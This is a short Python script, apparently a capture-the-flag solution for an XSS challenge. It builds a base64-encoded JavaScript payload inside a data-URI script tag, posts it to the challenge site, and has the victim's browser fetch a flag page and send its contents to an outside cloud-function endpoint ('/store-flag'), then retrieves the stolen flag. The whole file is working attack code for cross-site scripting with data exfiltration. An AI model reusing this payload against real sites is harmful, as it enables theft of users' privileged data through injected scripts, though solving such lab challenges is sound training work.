import sys
import requests 
import base64

payload_part1 = "var xhr = new XMLHttpRequest();" \
+ "xhr.open('GET','/xss-three-flag',true);" \
+ "xhr.onload = function () {" \
+ "var request = new XMLHttpRequest();" \
+ "request.open('GET','"

payload_part2 = "/store-flag?flag=' + xhr.responseText,true);" \
+ "request.send()};" \
+ "xhr.send(null);"

url = "https://us-west1-corgi-test.cloudfunctions.net"

if len(sys.argv) != 2:
    print("Please specify challenge URL and request bin URL")
    print("python solution.py <challenge-url>")
else:  
	vector = payload_part1 + url + payload_part2
	vector_bytes = vector.encode("ascii") 
	base64_bytes = base64.b64encode(vector_bytes)
	base64_string = base64_bytes.decode("ascii") 
	vector = "<script src=\"data:text/javascript;base64," + base64_string + "\"></script>"
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-three-result', data=param)
	print("Response as non-Admin")
	print(response.text)
	print("Response as Admin")
	response = requests.get('https://us-west1-corgi-test.cloudfunctions.net/print-flag')
	print(response.text)
